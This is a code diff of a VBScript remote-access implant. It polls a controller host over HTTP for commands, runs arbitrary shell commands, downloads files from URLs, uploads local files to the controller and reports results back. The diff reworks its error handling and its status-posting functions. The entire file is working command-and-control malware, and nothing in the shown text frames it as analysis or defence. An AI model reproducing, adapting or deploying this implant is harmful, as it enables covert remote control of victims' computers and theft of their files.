@@ -11,13 +11,12 @@
 '
 
 Option Explicit
-On Error Resume Next
 ' General
 Dim strResponse, arrResponseText, strRawCommand, strCommand, strArgument, strPostResponse
 ' Configuration
 Dim strHost, strPort, strUrl
 ' SLEEP
-Dim intSleep, strSleep
+Dim intSleep
 ' SHELL
 Dim fs, shell, strOutFile, file, text
 ' WGET
@@ -45,12 +44,9 @@ While True
     http.Open "GET", strUrl & "/", False
     http.Send
     strRawCommand = http.ResponseText
-
-    ' Debugging
-    'strRawCommand = "SHELL ipconfig"
+    arrResponseText = Split(strRawCommand, " ", 2)
 
     ' Determine command and arguments
-    arrResponseText = Split(strRawCommand, " ", 2)
     strCommand = arrResponseText(0)
     strArgument = ""
     If UBound(arrResponseText) > 0 Then
@@ -67,13 +63,9 @@ While True
         
         ' Set sleep time
         Case "SLEEP"
-            If strArgument <> "" Then
-                intSleep = CInt(strArgument)
-                SendStatusUpdate strRawCommand, "Sleep set to " & strArgument & "ms"
-            Else
-                strSleep = CStr(intSleep)
-                SendStatusUpdate strRawCommand, "Sleep is currently set to " & strSleep & "ms"
-            End If
+            intSleep = CInt(strArgument)
+            strResponse = "Sleep set to " & strArgument & "ms"
+            SendStatusUpdate
         
         ' Execute command
         Case "SHELL"
@@ -88,7 +80,8 @@ While True
             fs.DeleteFile strOutFile, True
 
             ' Set response
-            SendStatusUpdate strRawCommand, text
+            strResponse = "--------------------------------------------------" & vbCrLf & text & "--------------------------------------------------"
+            SendStatusUpdate
 
         ' Download a file from a URL
         Case "WGET"
@@ -97,25 +90,20 @@ While True
             strFilename = arrSplitUrl(UBound(arrSplitUrl))
 
             ' Fetch file
-            Err.Clear() ' Set error number to 0
             http.Open "GET", strArgument, False
             http.Send
 
-            If Err.number <> 0 Then
-                SendStatusUpdate strRawCommand, "Error when downloading from " & strArgument & ": " & Err.Description
-            Else
-                ' Write to file
-                Set stream = createobject("Adodb.Stream")
-                With stream
-                    .Type = 1 'adTypeBinary
-                    .Open
-                    .Write http.ResponseBody
-                    .SaveToFile strFilename, 2 'adSaveCreateOverWrite
-                End With
+            ' Write to file
+            Set stream = createobject("Adodb.Stream")
+            stream.Type = 1
+            stream.Open
+            stream.Write http.ResponseBody
+            stream.SaveToFile strFilename, 2
+            stream.Close
 
-                ' Set response
-                SendStatusUpdate strRawCommand, "File download from " & strArgument & "successful."
-            End If
+            ' Set response
+            strResponse = "File download successful."
+            SendStatusUpdate
 
         Case "GET"
             ' Only download if file exists
@@ -131,56 +119,58 @@ While True
                 stream.LoadFromFile strArgument
                 binFileContents = stream.Read
 
-                DoHttpBinaryPost "upload", strRawCommand, strFilename, binFileContents
+                DoHttpBinaryPost strFilename, binFileContents
             Else
-                SendStatusUpdate strRawCommand, "File does not exist: " & strArgument
+                strResponse = "File does not exist: " & strArgument
+                SendStatusUpdate
             End If
         Case "KILL"
-            SendStatusUpdate strRawCommand, "Goodbye!"
+            strResponse = "Goodbye!"
+            SendStatusUpdate
             WScript.Quit 0
 
         Case Else
-            SendStatusUpdate strRawCommand, "Unknown command"
+            strResponse = "Unknown command"
+            SendStatusUpdate
     End Select
 Wend
 
 
-Function SendStatusUpdate(strText, strData)
-    Dim binData
-    binData = StringToBinary(strData)
-    DoHttpBinaryPost "cmd", strText, "cmdoutput", binData
+Function SendStatusUpdate()
+    strPostResponse = vbCrLf & "> " & strRawCommand & vbCrLf & strResponse & vbCrLf
+    DoHttpPost strPostResponse
 End Function
 
 
-Function DoHttpBinaryPost(strActionType, strText, strFilename, binData)
+Function DoHttpPost(strData)
+    http.Open "POST", strUrl & "/", False
+    http.Send "result=" & strData
+    DoHttpPost = http.ResponseText
+End Function
+
+
+Function DoHttpBinaryPost(strFilename, binData)
     ' Compile POST headers and footers
     Const strBoundary = "----WebKitFormBoundaryNiV6OvjHXJPrEdnb"
-    Dim binTextHeader, binText, binDataHeader, binFooter, binConcatenated
-    binTextHeader = StringToBinary("--" & strBoundary & vbCrLf & _
-                                   "Content-Disposition: form-data; name=""cmd""" & vbCrLf & vbCrLf)
-    binDataHeader = StringToBinary(vbCrLf & _
-                                   "--" & strBoundary & vbCrLf & _
-                                   "Content-Disposition: form-data; name=""result""; filename=""" & strFilename & """" & vbCrLf & _
-                                   "Content-Type: application/octet-stream" & vbCrLf & vbCrLf)
-    binFooter = StringToBinary(vbCrLf & "--" & strBoundary & "--" & vbCrLf)
+    Dim binHeader, binFooter, binConcatenated
+    binHeader = StringToBinary(vbCrLf & _
+                               "--" & strBoundary & vbCrLf & _ 
+                               "Content-Disposition: form-data; name=""upfile""; filename=""" & strFilename & """" & vbCrLf & _
+                               "Content-Type: application/octet-stream" & vbCrLf & vbCrLf)
+    binFooter = StringToBinary(vbCrLf & vbCrLf & "--" & strBoundary & "--" & vbCrLf)
 
-    ' Convert command to binary
-    binText = StringToBinary(strText)
-
-    ' Concatenate POST headers, data elements and footer
-    Dim oStream : Set oStream = CreateObject("Adodb.Stream")
+    ' Concatenate headers, data and footers
+    Dim oStream : Set oStream = CreateObject("ADODB.Stream")
     oStream.Open
     oStream.Type = 1 ' adTypeBinary
-    oStream.Write binTextHeader
-    oStream.Write binText
-    oStream.Write binDataHeader
+    oStream.Write binHeader
     oStream.Write binData
     oStream.Write binFooter
     oStream.Position = 0
-    binConcatenated = oStream.Read(oStream.Size)
+    binConcatenated = oStream.Read(LenB(binHeader) + LenB(binData) + LenB(binFooter))
 
     ' Post data
-    http.Open "POST", strUrl & "/" & strActionType, False
+    http.Open "POST", strUrl & "/", False
     http.SetRequestHeader "Content-Length", LenB(binConcatenated)
     http.SetRequestHeader "Content-Type", "multipart/form-data; boundary=" & strBoundary
     http.SetTimeouts 5000, 60000, 60000, 60000
@@ -204,6 +194,9 @@ Function StringToBinary(Text)
     ' Change stream type To binary
     BinaryStream.Position = 0
     BinaryStream.Type = 1 'adTypeBinary
+  
+    ' Ignore first two bytes
+    BinaryStream.Position = 2
   
     ' Return binary data
     StringToBinary = BinaryStream.Read
